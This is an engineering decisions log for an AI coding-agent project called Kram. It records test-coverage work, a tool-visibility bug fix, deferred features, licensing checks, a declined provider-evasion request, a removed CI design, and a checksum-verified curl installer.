  independence, snapshot-is-a-copy-not-a-live-view, and a 50-goroutine
  concurrent-access test under `-race` — the actual point of this
  package's separate per-counters mutex. 0% → 97.7%.
- **`internal/cli/statusclient`** (new): `Fetch` success/non-2xx/decode-
  error/unreachable-gateway. 0% → 92.9%.
- **`internal/cli/daemonclient`** (new): every JSON method
  (`CreateSession`/`ListSessions`/`GetSession`/`ListTools`/`GetContext`/
  `AnswerQuestion`/`AnswerApproval`), `doJSON`'s error-body-vs-plain-
  status fallback, and `SendMessageStream`/`MessageStream.Next` — SSE
  delta/done parsing, malformed-event skipping, EOF-without-`[DONE]`
  reporting done, and images being included in the posted body when
  present. 0% → 86.9%.
- **`internal/daemon/server`** (new): every HTTP handler exercised
  through a real `Server` wired to a real `session.Service` and
  `agent.Service` (mirroring `promptassembly_test.go`'s
  `newTestService` pattern, extended with a scripted `httptest` gateway)
  — health, session CRUD, 404s, the full SSE send-message stream ending
  in `[DONE]`, answer/approve 404-and-400 branches, `/tools`, and
  `recoverMiddleware` actually turning a handler panic into a 500
  instead of taking the daemon down (the literal invariant this file's
  own package doc comment states). 0% → 75.9%.

**`internal/oauthflow` needed one narrow, deliberate production change**
to become testable at all: `anthropicOAuthBase`/`anthropicAPIBase`
(anthropic.go), `openAIAuthBase` (openai.go), and `openRouterAuthURL`/
`openRouterExchangeURL` (openrouter.go) were `const`, hardcoded to the
real Anthropic/OpenAI/OpenRouter hosts — meaning every token-exchange
call was untestable without either hitting the real internet or never
exercising the decode/error-branching logic at all. Changed to package-
level `var`s with the same default values; nothing in production code
ever reassigns them, only tests do, via a save-and-`t.Cleanup`-restore
helper per file. This is the same class of change as `NewRegistry`
already taking a plain `disabled map[string]bool` instead of importing
`internal/toolsettings` (see "Tool Semantics Registry" above) —
substitutability added at the exact seam a test needs it, nothing more.

With that seam in place: full PKCE round trips for all three providers
— `Authorize()` → a real HTTP GET to the returned local callback URL
(standing in for the browser redirect, not a real browser) → `wait()`
→ the exchange call landing on an `httptest.Server` — plus each
provider's callback-handler error branches (state mismatch, denied/
error param, missing code) and each exchange function's success/
provider-rejection/no-error-field/decode-failure paths.
`TestOpenAIAuthorizeFullRoundTrip` binds the real fixed port 1455 this
flow requires (see openai.go's own doc comment on why it can't be
ephemeral) — verified stable across `-race -count=3`, since a leaked
listener from an earlier test would otherwise make every later one on
that port flake. 3.5% → 80.5%.

**`internal/cli/app`** (the terminal UI) got a narrower, explicitly-
scoped pass: `helpers_test.go` covers every genuinely pure function that
could be found — `formatAge`, `formatTokens`, `contextBar`'s proportional
segment math, `providerKindForEnvVar`, `accountByID`,
`wizardGatewayModeLine`'s three-tier threshold, `pingDot`/`pingDetail`,
`badgeForProvider`'s breaker-open/unstable/healthy states,
`suggestedProjectsRoot`, `expandTilde`, `lastAssistantTokens`, and
`wizardHasProvider`/`wizardHavePaidProvider` (deterministic only because
the test explicitly clears every `providercatalog.Accounts` env var
first — these two read the real process environment, so a test that
didn't would depend on whatever's set on the machine running it). 15.9%
→ 21.7%, most of the remaining 78% being `View()`/`Update()` rendering
and `tea.Cmd` closures that make real daemon/gateway/OAuth calls — the
honest ceiling for this scope. A test that renders a lipgloss string and
asserts "non-empty" verifies almost nothing; this package's actual
golden-path coverage comes from running it in a real terminal (this
session's own live-verification discipline, applied earlier in this
document to the daemon/gateway/CLI wiring), not from asserting on ANSI
byte soup. Deeper `Update()`/`Cmd` coverage — feeding real `tea.Msg`
values into a `Model` and asserting on state transitions, without a
rendering terminal — is a real, separate follow-up if this package's
bug rate ever justifies the investment; not attempted here.

Net result: aggregate coverage 44.1% → 53.3%
(`go tool cover -func` over the whole module). Every package that had
real, untested logic at 0% now has substantive coverage; the packages
still at 0% (`cmd/kram`, `cmd/gateway`, `cmd/daemon`, `cmd/cli`,
`devtools/*`, `evals`) are thin `main()` entry points or dev-only
tooling with nothing to unit-test that isn't already covered where the
real logic lives. Verified with the same baseline as every other change
in this document: `gofmt -l .` clean, `go vet ./...` clean,
`go test ./... -race` green across every package, and a Windows
cross-compile of `cmd/kram` still succeeding.

## Tool Semantics Registry: VisibleTools closes the AllTools()/Definitions() mismatch

A review of `e80e919` and the commits before it (the Gateway Round retry
fix, the Tool Semantics Registry, and the coverage push) found one real
bug in the registry itself, introduced by the registry's own launch:
`compileToolsOverview` built the prompt's Tools section from
`Registry.AllTools()`, which excludes only *settings-disabled* tools —
not tools the permission policy denies unconditionally (`FullyDenied`).
`Definitions()`, the function that actually decides what the model's
wire-format tool schema contains, has always filtered both. The result:
a tool denied outright by policy — the concrete example the review gave
is the Strict permission preset's `{"tool":"delete_file","pattern":"*",
"decision":"deny"}` rule — kept `Disabled: false` in `AllTools()` and so
still got a line in the generated prompt (`delete_file — Scoped to a
single file...`), while `Definitions()` correctly omitted it from the
schema the model can actually call. The model could be told a tool
exists that it has no way to invoke — precisely the kind of mismatch the
Tool Semantics Registry exists to make impossible, just moved one layer
down instead of eliminated.

Root cause: two functions computing "what's visible" independently,
with silently different filters, and nothing forcing them to agree.

Fixed by introducing the single source both were supposed to share:
`Registry.VisibleTools() []Tool` (`internal/daemon/tools/tools.go`),
filtering exactly what `Definitions()` always filtered — `r.disabled` and
`r.permEval.FullyDenied` — sorted by name. `Definitions()` now builds its
wire-format list from `VisibleTools()` instead of duplicating the filter
inline (a small side effect: `Definitions()`'s output is now
deterministically name-ordered, where it was previously unordered map
iteration — nothing reads it order-sensitively, checked before making
this change). `compileToolsOverview` (`internal/daemon/agent/
promptcompiler.go`) now calls `reg.VisibleTools()` instead of
`reg.AllTools()`. `AllTools()` itself is unchanged and still the right
function for its one real caller, the settings/tools-toggle screen —
that screen needs to show a permission-denied tool too, so a user can
see it exists and adjust the policy, which is a different concern from
"what can the model use right now" and deliberately stays a separate
axis (`AllTools()`'s `Disabled` field only ever meant "settings-
disabled", never "policy-denied" — that distinction was already correct
before this fix, it just wasn't the thing `compileToolsOverview` should
have been filtering on).

New regression tests pin exactly the gap that let this through unnoticed
the first time: the original `compileToolsOverview` test used a
settings-`disabled` map to prove a tool disappears from the overview,
which — since `AllTools()` and `VisibleTools()` agree on settings-
disabled tools — passed against both the buggy and the fixed code and
proved nothing about permission denial.
`TestPermissionFullDenyHidesToolFromVisibleToolsToo`
(`internal/daemon/tools/permission_test.go`) and
`TestCompileToolsOverviewExcludesPermissionFullyDeniedTool`
(`internal/daemon/agent/promptcompiler_test.go`) both drive a real
`permissions.json` deny-all rule instead — the same mechanism a Strict
preset uses — and assert the denied tool is absent from `VisibleTools()`/
the generated overview while still present (correctly, `Disabled: false`)
in `AllTools()`. Live-verified against real separate `mock-provider`/
gateway/daemon processes with a `.kram/permissions.json` denying
`delete_file`: the real captured gateway request confirmed `delete_file`
absent from both the generated prompt's Tools section and the wire
`tools` array (32 tools, matching), where before the fix it would have
appeared in the prompt only.

The same review flagged a second issue in the Gateway Round retry fix
(`5a225d0`): `Retryable` is now correctly computed from the whole
attempt trail (any attempt retryable ⇒ `Retryable: true`), but
`RetryAfterMS` still comes from `lastErr` alone via a single
`errors.As(lastErr, &httpErr)` check — so a trail like 429 (with a real
`Retry-After: 10s`) → 503 → 404 correctly reports `Retryable: true` but
`RetryAfterMS: 0`, since the last attempt (404) carried no `Retry-After`
header. The agent's Gateway Round retry then backs off on its own
default (~500ms) instead of honoring the 10s a real upstream asked for.
Confirmed real, **deliberately not fixed here** — the reviewer's own
call, agreed with: a proper fix belongs with the deferred failure-domain/
per-provider-cooldown work already on record above ("Two other findings
from the same review" in the Gateway Round retry section) rather than a
quick patch that would still be wrong in spirit (the right behavior
isn't "carry one more field through," it's "don't retry provider A
again for 10s specifically, while B and C remain immediately retriable,"
which needs real per-provider route health, not a single aggregate
`RetryAfterMS`). Recorded here so it isn't lost track of, not
addressed.

## Boundaries

Several things were deliberately not built. Recording them so they don't
get quietly re-litigated.

### Phase 2 hardening items, deferred from the pass above

All confirmed real during the same review, all explicitly pushed out to
keep that pass reviewable and honor its own feature freeze (no new UI
surface, no bigger architecture changes than the fixes strictly needed):

- **Real `/models`-based capability verification for custom providers**
  (parsing `providerping`'s already-issued `GET /models` response body,
  a picker in the Accounts UI). The Model-required fix above already
  closes the actual safety hole by construction; this would only be UX
  polish on top of an already-safe baseline, and a picker is a new UI
  surface the freeze rules out.
- **`Retry-After` header parsing for `anthropic.go`/`gemini.go`** — only
  `openai_compat.go` got it (Chunk 4), since that's the adapter behind
  every free-tier/rate-limited provider Kram actually talks to in
  practice. The other two degrade to computed backoff, a missed
  optimization, not a correctness gap.
- **Per-round `RouteTrace` detail.** Only the *last* Gateway Round's
  attempts feed the structured route trace UI; earlier rounds are still
  fully visible via `EventNotice`s and logs, just not in that view.
  Concatenating every round's attempts with a round-boundary marker is a
  real, reasonable follow-up, not a correctness fix.
- **Smart telemetry rewrite** (EWMA/prior-smoothed reliability instead of
  raw cumulative success rate, splitting TTFT from true end-to-end
  latency instead of comparing streaming and buffered candidates on the
  same number) — real, confirmed, but a ranking-quality improvement, not
  a P0.
- **OpenRouter account-level failure domains** in the breaker (three
  catalog entries share one `OPENROUTER_API_KEY`, three independent
  breaker keys) — real, confirmed, genuinely lower urgency than the P0s
  above.
- ~~**A `scripts/verify.sh` regression harness** enforced pre-push.~~
  Closed: the script now owns diff/format checks, vet, a fresh race suite,
  host build, Windows and Android cross-builds, and installer tests. The
  release script calls this same gate instead of carrying a second list.

### The remaining items in the agent-architecture study, deferred

`KRAM_Estudo_Mestre_Agentes_Competitivos.md` proposes ten subsystems.
Prompt Compiler and Tool Semantics Registry have now been built. The
remaining items —
Model Profiles, Agent Profiles (build/plan/explore/review/verify),
the Reminder Engine, `ProjectInstructionResolver` (hierarchical scoped
`AGENTS.md`), Compaction v2 + hidden utility
agents, the Learning Loop (memory-curator/skill-curator), Artifacts v2,
a Hook API, and cognitive/multi-provider routing — are explicitly not
started. The study's own recommended ordering (§16) and its closing
"Status" section both say the same thing: convert this into a sequence
of scoped changes, never all of it at once. `PromptPart`'s `Placement`/
`Refresh`/`Source` fields exist now specifically so the next item in
that sequence has real data to build against instead of starting cold —
but which item is next, and its own design, is a separate decision each
time, not a queue to work through automatically.

### No account rotation or provider evasion

A request to build free-tier account rotation with proxy diversification
and user-agent spoofing was declined. A disposable local mock provider
was built instead, which solved the actual need (testing without burning
quota).

**Why:** the purpose of that system is circumventing a provider's terms,
and no framing changes that. The `opencode-zen` entry in the catalog is
the opposite case and worth contrasting: one legitimate account's own key
pointed at a documented public endpoint.

### No proprietary content copied

Three separate times, content that was publicly *visible* turned out not
to be permissively *licensed*:

- `anthropics/claude-code` — "© Anthropic PBC, all rights reserved"
  despite the public repo. Its `frontend-design` skill was not copied; an
  MIT-licensed equivalent was found instead.
- `anthropics/skills` — per-skill mixed licensing. Most Apache-2.0, but
  the document skills are proprietary and one has no license at all.
- `Gitlawb/openclaude` — the source tree contains internal feature-flag
  names, internal env vars, and internal cost-analysis comments, which
  indicates extracted proprietary source rather than an independent
  project. Used only as evidence of what patterns exist, not mined for
  implementation.

**The rule applied:** verify the LICENSE file, not GitHub's detected
label. Public is not permissive.

### Skill licenses are verified per repository

Every bundled skill's license was read from the source repo's LICENSE
file before copying, and each installed copy keeps a `SOURCE` file.
`skill_install` reports a repo's license and warns when there isn't one —
but never judges whether copying is permitted. That's the user's call,
not a regex's.

### No YAML dependency for two fields

Skill frontmatter is hand-parsed.

**Why:** pulling in a YAML parser to read `name` and `description` isn't
worth the dependency. It does handle block scalars (`>` and `|`) —
**added after** a real external skill using `description: >` silently
produced an empty description.

### A weak model's empty final answer gets one retry, then a visible fallback

**Found reproducing a real report:** the user described Kram "stopping
silently" — no error, no quota message, just nothing. The daemon's own
logs showed every turn completing normally, with real telemetry (provider,
latency, token counts) and a persisted assistant message. So the backend
was not failing. The persisted message's content was an empty string.

**What actually happened:** `bash` reported a normal, expected non-zero
exit (`grep` finding no matches) as `[exit error: exit status 1]`. A
free-tier model reading that tool result interpreted "error" literally,
and instead of explaining or retrying, returned a genuinely empty
completion as its final answer — no text, no tool calls. Kram persisted
and displayed exactly that: nothing. Confirmed against the real
combination of providers in use (`openrouter-gptoss`), not just the mock.

**Two fixes, not one:**

1. `bash`'s error framing no longer editorializes. A non-zero exit is
   reported as `[exit code N]`, not `[exit error: ...]` — grep's "no
   matches", diff's "files differ", and a failing test's non-zero exit
   are all *normal outcomes* of running those commands, and telling a
   model "error" when nothing actually broke is what triggered the
   give-up behavior in the first place.
2. The loop itself no longer treats an empty final answer as done. One
   retry, with an explicit system nudge telling the model its previous
   response was empty; if it happens twice in a row, the user gets a
   clear message instead of silence. This is the actual fix for "stops
   silently" — even in the case where a model just does this regardless
   of what triggered it, the user now always sees *something*.

**A second, independent bug found along the way:** `grep` was walking
into `.kram/` — the daemon's own live SQLite database — and returning
binary garbage (control bytes) as search matches, exactly the kind of
confusing tool result that can contribute to a model giving up. `.kram`
is now in the same ignore list as `.git`/`node_modules`, and `grep`
additionally sniffs for a NUL byte in the first 8KB of any file outside
the ignored directories, so an explicit path to some other binary file
doesn't hit the same problem.

`devtools/mock-provider` gained an `-empty-replies N` flag to make this
class of failure reproducible on demand rather than only when a specific
free-tier model happens to misbehave.

---

## Continuous integration — *deferred*

`.github/workflows/` was built out in full (see the design below — kept
verbatim, not deleted, since it's exactly what gets restored if this
comes back) and then removed. Diagnosing the original observability
complaint (see below) surfaced that GitHub Actions could not execute at
all on this account — every run, including GitHub's own internal
Dependabot dependency-graph workflow with no user-authored YAML, failed
instantly with `startup_failure`, which points at an Actions
billing/spending-limit condition rather than anything fixable by editing
workflow files. Rather than ship CI infrastructure that cannot prove it
runs, the workflows were removed and releases/local validation went
manual instead:

- `go build ./...`, `go vet ./...`, `gofmt -l .`, `go test ./... -race`
  run locally before every push (same commands the removed workflow
  would have run);
- releases are cut with `scripts/release.sh`, which runs that same gate
  itself before building and publishing — see "curl-based install
  distribution" below and the README's "Building releases".

This is a cost decision, not a technical one — GitHub Actions on a free
personal plan comes with a limited included-minutes quota, and this
account is past whatever threshold requires a paid spending limit. The
design below is ready to restore as-is the moment that's revisited.

### Check Runs and Commit Statuses are two different APIs, not two names for the same thing

**Found as a real observability gap.** `.github/workflows/ci.yml` had run since the workflow was first added, and GitHub's own Actions UI showed it green — but `GET /repos/{owner}/{repo}/commits/{sha}/status` (the classic Commit Status API) returned `statuses: []` for every commit, even ones CI had clearly checked.

This is not a bug in that endpoint. GitHub Actions jobs automatically create **Check Runs** (grouped into a Check Suite owned by the "github-actions" App) — that's what populates the PR "Checks" tab and the green check mark next to a commit in the GitHub UI. The classic **Commit Status API** (`POST/GET .../statuses/{sha}`) is a separate, older mechanism predating Actions, originally built for external CI services (Travis, CircleCI, Jenkins) that had no other way to report into GitHub. Actions never populates it on its own. A repo that only uses Actions will always show `statuses: []` to anything querying that specific endpoint — regardless of whether CI is passing, failing, or has never run — because nothing ever calls it.

Since external tooling and scripted audits commonly assume the classic API is authoritative (it's the older, simpler, more widely-integrated one), the fix publishes **both**: native Check Runs (automatic, zero extra code, the richer/native GitHub UX) and explicit classic Commit Statuses (`.github/actions/report-status`, a small composite action calling `POST .../statuses/{sha}` once per job) with matching `kram/*` contexts. Neither replaces the other; they're kept in sync by construction, not by best effort.

### A second, unrelated, worse problem was already there: `startup_failure` on every run

Diagnosing the above surfaced something more serious: every CI run since the workflow existed had `conclusion: "startup_failure"` — `jobs: []`, zero check runs created, nothing ever actually executed. Both `.github/workflows/ci.yml` and `.github/workflows/release.yml` parse as valid YAML (verified with `actionlint`, which reported zero issues against the rewritten workflow), which ruled out a workflow-file syntax problem as the cause. The conclusive signal: GitHub's own internal Dependabot dependency-graph-update workflow — which has no YAML file in this repo and nothing to do with `ci.yml`'s content — failed identically on the same pushes. A workflow the repo owner has zero authorship over cannot fail because of a mistake in `ci.yml`; whatever is blocking execution is scoped above the repository, most consistent with a GitHub Actions billing/spending-limit condition on the account (the most common cause of *every* workflow failing to schedule at once) rather than anything this task can fix by editing YAML. This is called out explicitly in the report to the user rather than declared "fixed" — the workflow is now correct, but has not yet been *proven* to execute, and won't be provable until whatever is blocking scheduling at the account level is resolved.

### Jobs, not steps — parallel, independently named, individually queryable

`build`, `vet`, `format`, and `test-race` are four separate jobs (their own runner, their own logs, their own Check Run/commit status), not four steps inside one `test` job. A single job collapses everything into one pass/fail signal — `go vet` failing looks identical to `gofmt` failing looks identical to a real test failure until someone opens the log and reads it. Separate jobs run in parallel (no reason `go vet` should wait for `go test -race` to finish) and let an external consumer ask "did the race detector pass?" without parsing log text.

An aggregate `ci` job (`needs: [build, vet, format, test-race]`, `if: always()`) is not a fifth job re-running everything — it's three lines of bash checking `needs.*.result` for `failure`/`cancelled`. `if: always()` is required so it still runs (and reports its own failure) when a dependency fails; without it, a broken `build` would leave `Kram / CI` stuck at `pending` forever instead of turning red.

The workflow is literally named `Kram` (not `ci`) because GitHub names each Check Run `<workflow name> / <job name>` — this is what produces the stable, human-readable `Kram / Build`, `Kram / Vet`, `Kram / Format`, `Kram / Test Race`, `Kram / CI` names, which is also exactly what a future `required status checks` branch-protection rule would reference. Classic commit-status contexts (`kram/build`, `kram/vet`, `kram/format`, `kram/test-race`, `kram/ci`) are named separately since that API has its own flat namespace with no workflow/job grouping concept.

### Status lifecycle has to actually terminate

Each job reports `pending` as its second step (right after checkout — checkout has to come first since the status-reporting step is a local composite action, `uses: ./.github/actions/report-status`, which only exists once the repo is checked out), then exactly one of `success`/`failure`/`error` at the end via three mutually exclusive step conditions: `if: success()`, `if: failure()`, `if: cancelled()`. The classic Commit Status API has no `cancelled` state, so a cancelled job reports `error` — the closest fit, and the important part is that *something* always fires. Without the `cancelled()` branch, a job cancelled mid-run (e.g. by `concurrency.cancel-in-progress` superseding it) would leave its status stuck at `pending` indefinitely, which is worse than not reporting anything at all.

### SHA correctness: `github.sha` is not always the SHA that matters

On a `pull_request` event, `github.sha` is GitHub's ephemeral, synthetic merge commit — it never exists as a real commit in the repo's permanent history and disappears once the PR closes. Reporting a commit status against it would make that status permanently unqueryable by the actual SHA anyone cares about. `env.SHA` is computed once at the workflow level as `github.event.pull_request.head.sha || github.sha` — the real PR branch tip on `pull_request`, falling through to the real pushed commit on `push` (where no `pull_request` context exists at all). Native Check Runs don't need this handling; GitHub's Actions/Checks integration already associates them with the correct head SHA for `pull_request` events on its own — this correction is specific to the classic Statuses API, which has no equivalent built-in awareness.

### `pull_request`, not `pull_request_target` — and least-privilege token permissions

`pull_request_target` runs workflow code with the base repository's token permissions and secrets even for a PR from a fork, which is a well-known privilege-escalation vector when combined with checking out and running PR-authored code — exactly the shape of this workflow (it runs `go build`/`go test` on the PR's own code). Plain `pull_request` was kept instead, at the cost of slightly more limited `GITHUB_TOKEN` permissions for fork PRs, which is the correct tradeoff here. Workflow-level `permissions: contents: read, statuses: write` is the actual minimum this workflow needs — nothing writes repository contents, comments on PRs, or triggers other workflows, so nothing broader was granted.

### Caching: `actions/setup-go`'s built-in cache, not a hand-rolled one

`cache: true` on `actions/setup-go@v5` (keyed from `go.sum`, covering both the module download cache and the build cache) is what the task asked to prefer over inventing manual `actions/cache` wiring — it already solves this correctly and is one line per job.

---

## curl-based install distribution

Kram's source (`codexmark/kram`) has to stay private, but a new machine
installing it shouldn't need a GitHub PAT, `gh auth login`, or any access
to the private repo at all — just `curl` and `tar`. The fix is
architectural, not a workaround: a second, public repository,
**`codexmark/kram-releases`**, holds nothing but an installer script and
GitHub Release binaries. It never contains a copy of Kram's source. The
private repo is where everything is built, tested, and packaged; the
public repo is purely a distribution surface the private repo's own
release process publishes to. Same constraint as "Continuous
integration" above carries through here without exception: no
`.github/workflows/` anywhere in this — every step, including the final
publish, runs on the maintainer's own machine via `gh`, which is a
publish-time dependency only, never something the end user needs.

**Stable asset names, not versioned ones.** `scripts/build-release.sh`
used to name every archive `kram-${VERSION}-${os}-${arch}.tar.gz` and
the binary inside it identically. That's wrong for a curl installer: it
would have to call the GitHub API just to discover the exact asset name
before it could download anything, adding a dependency and a failure
mode `curl`+`tar` alone don't need. Assets are now named purely from
platform — `kram-linux-amd64.tar.gz`, `kram-darwin-arm64.tar.gz`,
`kram-windows-amd64.zip` — with the binary inside always just `kram`
(`kram.exe` on Windows). The version lives only in the release tag/URL
segment (`releases/latest/download/...` or
`releases/download/vX.Y.Z/...`), which is exactly what GitHub's own
"latest" redirect and versioned-download URLs are for. `SHA256SUMS` is
generated alongside every build. The script also self-checks: after
building the *host's own* OS/ARCH target (the only one it can actually
execute), it runs `kram -version` against the fresh binary and aborts
the whole build if the reported version doesn't match what was passed
in — cross-compiled targets can't be executed to verify the same way,
but they share the exact same `-ldflags -X main.version=...` mechanism
the native build just proved works, so trusting them is a reasoned
inference, not a blind spot.

**`scripts/release.sh`** is the one command that publishes a release:
validates the version argument looks like semver, requires `gh`/`git`/
`go` on `PATH` and `gh` to already be authenticated, requires a clean
`git status --porcelain` (aborts otherwise — a release has to be
reproducible from a known commit, so publishing a working tree with
uncommitted changes is refused outright, no `--allow-dirty` escape
hatch added since nothing has needed one yet), then runs the same
`gofmt -l .` / `go vet ./...` / `go test ./... -race` gate this project
already runs before every push. Only after all of that passes does it
call `build-release.sh`, print a summary (version, commit, target repo,
asset list), ask for confirmation (skippable with `--yes`), and publish
via `gh release create --repo codexmark/kram-releases`. The confirmation
step exists specifically because publishing a release is a hard-to-
undo, externally-visible action — the same category of action this
project's own operating principles already treat as needing an explicit
human "yes," just enforced in a script instead of relied on by habit.

**`install.sh`** (drafted and versioned here at `scripts/dist-repo/
install.sh`, published as-is — same bytes, no build step — to the
public repo's root; `scripts/dist-repo/README.md` the same way for that
repo's README) is deliberately small and auditable: detect OS
(`uname -s`; Linux/Darwin plus conservative Termux detection — Windows gets a `.zip` download and a
pointer to it, not an attempt to make Bash and
PowerShell share one code path) and architecture (`uname -m`, normalized
to `amd64`/`arm64`), build the download URL from
`KRAM_VERSION`+`KRAM_RELEASES_REPO`/`latest`, download to a `mktemp -d`
directory cleaned up via `trap ... EXIT` regardless of how the script
exits, download `SHA256SUMS` and verify the asset against it
(`sha256sum`, falling back to `shasum -a 256` on macOS; if *neither*
exists, the script refuses to install rather than silently skipping
verification), extract, and only *then* copy the binary into
`KRAM_INSTALL_DIR` (default `$HOME/.local/bin`) — download, verify, and
extract all have to succeed before anything touches the install
directory, so a failed download or a bad checksum can never leave a
half-installed or corrupted binary in place of a working one. No
`sudo` anywhere, and no automatic edits to `~/.bashrc`/`~/.zshrc`/
`~/.profile` — if the install directory isn't already on `PATH`, the
script prints the exact `export PATH=...` line and stops there, since
editing a user's shell config unattended has too many real edge cases
(which file, which shell, whether it's already been added, dotfiles
managed by something else entirely) to do safely as a first version.
Post-install, it actually runs `$INSTALL_DIR/kram -version` and fails
loudly if that doesn't work — copying the file is not the same as
proving it runs, and this is what catches an architecture mismatch or a
corrupted archive immediately instead of at the user's next `kram`
invocation.

Verified locally before ever touching the real public repo: a full
`build-release.sh` run confirmed stable names, the in-archive `kram`
name, `SHA256SUMS`, and the native-target version self-check all work;
`release.sh`'s argument validation and dirty-working-tree abort were
exercised directly (the latter briefly surfaced this machine's own
known `gh` mise-shim issue — see the reference memory on it — resolved
by using the real `gh` binary path, not a script bug); `install.sh` was
run against a local Python `http.server` serving a real `dist/` output
(via an internal-only `KRAM_BASE_URL` override that production installs
never set) through five scenarios: a clean install, the "install
directory not on PATH" guidance branch, a 404'd asset, and a tampered
`SHA256SUMS` — the last one confirmed the install directory was never
even created, proving the atomicity claim above rather than just
asserting it.

**A real bug survived that local testing and was only caught by the
genuine end-to-end acceptance test** — installing for real via
`curl ... | sh` against the live public repo, not the local
`KRAM_BASE_URL`-overridden dry run. `KRAM_INSTALL_DIR=/tmp/x curl -fsSL
... | sh` silently installed to the default `$HOME/.local/bin` instead
of `/tmp/x`, with no error. The cause has nothing to do with
`install.sh`'s own logic (it correctly reads `$KRAM_INSTALL_DIR`) — it's
a POSIX shell semantics gotcha in the *documented invocation itself*:
`VAR=value cmd1 | cmd2` only exports `VAR` into `cmd1`'s environment,
not `cmd2`'s, and `sh` — the process that actually reads
`KRAM_INSTALL_DIR` — is `cmd2` in that pipeline. `curl` never looks at
the variable, so nothing about the failure was visible; it just quietly
did the default thing. The fix is documentation-only, not a code
change: every example moved the variable to immediately before `sh`
(`curl -fsSL ... | KRAM_INSTALL_DIR=/tmp/x sh`), which *does* scope
correctly since `sh` is the last command in the pipe, confirmed by
re-running the exact same real `curl | sh` install with both
`KRAM_VERSION` and `KRAM_INSTALL_DIR` set this way and getting the
right version in the right directory. Worth being honest about why the
five earlier local scenarios didn't catch this: every one of them
invoked `install.sh` directly as a file (`bash install.sh` with env
vars set the normal way, or via `env -i ... bash install.sh`) rather
than through the actual `curl | sh` pipe the README instructs users to
run — a gap in what "local testing" covered, not a gap in test count.

No GoReleaser, Docker, Nix, Homebrew, or build-tool dependency beyond
what the project already has (Go, a POSIX shell, `gh`) was introduced —
Kram's whole architectural advantage here is being one static,
`CGO_ENABLED=0` Go binary; the distribution mechanism is sized to match
that simplicity, not to anticipate needs nobody has yet.

---

## Onboarding completion and live tool settings

Stage 1 only makes the gateway/daemon startable; it is not completion.
`onboarding.SaveProgress` persists ProjectsRoot/LastWorkspace with
`Completed=false`, and only Ready calls `onboarding.Save`. This also means
re-running `--setup` cannot inherit a stale completed marker if the user exits
during Tools or System Check.

Tool presets are desired-state reconciliation, not incremental mutations:
Recommended replaces the disabled set with empty; Minimal replaces it with
exactly the currently registered non-safe tools. The CLI persists first and
then sends the same set to `PUT /tools/settings`; the registry swaps it under a
lock, so the first Welcome session and later settings changes do not require a
daemon restart.

Provider presence and provider health are separate gates. OK and Degraded
(successful but slow) may continue normally. Down/unknown cannot use ordinary
`n`; a separate, visible `c` override exists for a known temporary outage.

## Context Policy v1

`internal/daemon/contextpolicy` makes the model window one allocation instead
of unrelated limits. Each iteration measures fixed prompt parts and tool
schemas, reserves one eighth of the window for the answer (capped at 8k), and
gives the remainder to effective history. The policy chooses Keep, structural
Prune, or Compact using the same chars/4 estimate as the context panel. Tool
output growth is capped by the history allocation still free after the current
turn, never by a constant that ignores prompt/history size.

The estimate remains intentionally provider-agnostic: exact tokenizers differ
between providers in one combo. The important invariant is consistent,
conservative accounting, not fake precision.

## Native Windows installer and Termux/Android target

Windows amd64 now has `install.ps1`: public assets only, SHA-256 before any
replacement, candidate self-check, current-user install/PATH, and cleanup.
Termux is an explicit `android/arm64` asset rather than an alias for Linux;
`install.sh` requires both the Termux marker and canonical prefix before
selecting it. Unix shell execution resolves `sh` from PATH/Termux prefix, and
OAuth URL launch prefers `termux-open-url`.

Android cross-compilation and installer selection are automated. Runtime
claims that depend on the Android kernel/terminal — process groups, TUI input,
SQLite persistence and a real provider call — still require a physical Termux
acceptance pass and are not inferred from a successful cross-build.

## Known gaps

Honest list of what Kram still doesn't have, as of this writing:

- ~~Background/async tasks.~~ Closed: `run_background`/`process_list`/
  `process_output`/`process_kill`. Scheduling (Hermes's `cronjob`) is
  still open — nothing triggers a run on a timer.
- ~~Plugins.~~ Closed for the tool-authoring half: `.kram/tools/*.json` /
  `kramhome/tools/*.json` manifests (`{name, description, command,
  schema}`, stdin-in/stdout-out) let anyone add a tool without touching
  Go. Pluggable memory providers or terminal backends (Hermes has both)
  are still open — narrower, lower priority.
- ~~MCP beyond tools.~~ Resources and prompts closed
  (`mcp_resource_list`/`read`, `mcp_prompt_list`/`get` — cross-cutting
  tools taking a server name, not one registered tool per item, since a
  server's resource set is unbounded and can change). Elicitation is
  still deferred — it needs the same turn-pausing plumbing
  `ask_question` required, and no server in real use has forced building
  it yet.
- ~~Test coverage.~~ Closed for the current risk profile: gateway, provider,
  TUI helpers/flows, daemon/CLI clients, onboarding, OAuth, routing, storage,
  tools and the standalone entrypoint error/config paths are covered. The thin
  `main` process loops remain primarily compile/smoke-tested by `verify.sh`.
- ~~Evals.~~ Closed: `evals/` runs scripted scenarios against the real
  configured provider (same in-process gateway+daemon wiring as
  `cmd/kram`), each a regression test for a specific behavior — several
  traced directly to bugs found by hand earlier in this project. Hard
  scenarios (does a turn ever return truly empty, does grep ever leak
  binary garbage, are core tools registered) must pass regardless of
  model; soft ones (does the model proactively use a skill/memory) are
  informational, since that depends on the configured model's capability,
  not just Kram's own code being correct. First real run against an
  actual provider found a genuine soft-fail: an unmistakable skill
  trigger phrase didn't get the model to call `skill_list`.
- ~~Distribution.~~ Closed for prebuilt binaries: `scripts/build-release.sh`
  cross-compiles `cmd/kram` for linux/darwin × amd64/arm64 plus
  windows/amd64 and android/arm64; `scripts/release.sh` runs the local gate,
  builds them and attaches the archives plus checksums to a GitHub release. This
  works with no cross-compiler toolchain and no per-platform build image
  — `CGO_ENABLED=0` — for the same reason cross-compiling has been free
  this whole project: the SQLite driver was chosen pure-Go specifically
  so the daemon's storage layer never needs cgo. Every target in the
  desktop matrix was hand-verified to actually build *and run* before being added
  (not just "cross-compiles without error" — modernc.org/sqlite is large
  enough that a target compiling cleanly isn't a given). A docs site is
  still open — narrower, and README + DECISIONS.md cover the same ground
  for now.

Scheduling, memory-provider/terminal-backend plugins, and MCP elicitation
remain deliberate omissions — narrower than what they'd extend.

A later, larger round closed the gaps that mattered most for capability,
safety, and reliability rather than raw feature count:

- ~~Cross-platform shell / process-tree cleanup.~~ Closed: `internal/shell`
  centralizes command construction and kill for `bash`/`run_background`/
  custom tools — a real process group + SIGTERM/SIGKILL on Unix, a Job
  Object on Windows (`cmd.exe`, not an assumed `sh.exe`). See "Cross-
  platform shell" above.
- ~~Tool permission policy.~~ Closed: `internal/permission` gates every
  tool call (built-in, custom, MCP) with ALLOW/ASK/DENY rules, a
  compatibility default of Allow, and a distinct approval flow from
  `ask_question`. See "Permissions" above.
